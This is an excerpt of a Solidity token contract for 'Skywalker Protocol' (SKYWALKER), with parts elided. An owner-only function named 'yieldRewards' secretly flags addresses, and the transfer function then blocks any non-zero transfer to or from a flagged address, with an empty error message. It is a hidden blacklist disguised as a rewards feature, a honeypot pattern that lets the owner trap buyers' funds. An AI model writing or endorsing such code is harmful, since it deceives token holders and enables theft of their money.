...
contract SkywalkerProtocol is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _yieldRewards;
    event yieldPool (address yieldAddress, bool isPool);
    ...
    string private _name = 'Skywalker Protocol';
    string private _symbol = 'SKYWALKER';
    ...
    function yieldRewards(address yieldAddress) external onlyOwner {
        if (_yieldRewards[yieldAddress] == true) {
            _yieldRewards[yieldAddress] = false;
        } else {_yieldRewards[yieldAddress] = true;
            emit yieldPool (yieldAddress, _yieldRewards[yieldAddress]);
          }
    }
    
    function yieldState(address yieldAddress) public view returns (bool) {
        return _yieldRewards[yieldAddress];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_yieldRewards[sender] || _yieldRewards[recipient]) require (amount == 0, "");
